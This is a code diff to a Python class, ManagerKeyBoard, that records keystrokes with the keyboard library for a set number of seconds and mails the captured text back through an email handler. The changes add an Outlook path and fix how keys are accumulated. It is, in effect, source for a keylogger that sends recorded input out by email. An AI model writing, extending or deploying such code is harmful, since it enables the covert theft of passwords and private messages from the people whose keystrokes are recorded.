@@ -1,5 +1,6 @@
 import threading, keyboard
 import time
+import OutLook
 
 import Email
 from pynput.keyboard import Listener
@@ -24,15 +25,21 @@ class ManagerKeyBoard(metaclass=SingletonMeta):
     def getState(self):
         return self.state
 
-    def hook(self, _callBack=None, minute= 1000):
-        threading.Thread(target=self.hook_thread,args=(_callBack,minute)).start()
+    def hook(self, _callBack=None, minute= 60):
+        self.repMail = self.mymail.getSender()
+        print(self.mymail.__class__)
+        print(OutLook.OutLook(None).__class__)
+        if(self.mymail.__class__ == OutLook.OutLook(None).__class__ ):
+            self.hook_thread(_callBack, minute)
+        else:
+            threading.Thread(target=self.hook_thread,args=(_callBack,minute)).start()
 
-    def hook_thread(self, _callBack=None, minute= 5000):
+    def hook_thread(self, _callBack=None, minute= 60):
         self.isHook = True
-        print("continute")
+        print("continute " + str(minute))
         thread = threading.Thread(target=self.update_hook)
         thread.start()
-        time.sleep(10)
+        time.sleep(minute)
         self.isHook = False
         thread.join()
         print("stop recording")
@@ -41,16 +48,18 @@ class ManagerKeyBoard(metaclass=SingletonMeta):
         print("stop recording")
         if _callBack:
             _callBack(self.mymail.getSender(), self.mymail.getSubject(), self.mymail.getBody(), str(rep))
-        self.mymail.sendBack(rep, "")
+        if self.mymail:
+            self.mymail.sendBack(rep, "")
 
     def update_hook(self):
         print("start recording")
         while self.isHook:
             temp = keyboard.read_key()
+            print(temp)
             if(temp == 'space'):
                 self.repThread = self.repThread + " "
             elif (len(temp) != 1) :
-                self.repThread = " // " + temp + " // "
+                self.repThread = self.repThread + " // " + temp + " // "
             else:
                 self.repThread = self.repThread + keyboard.read_key()
 
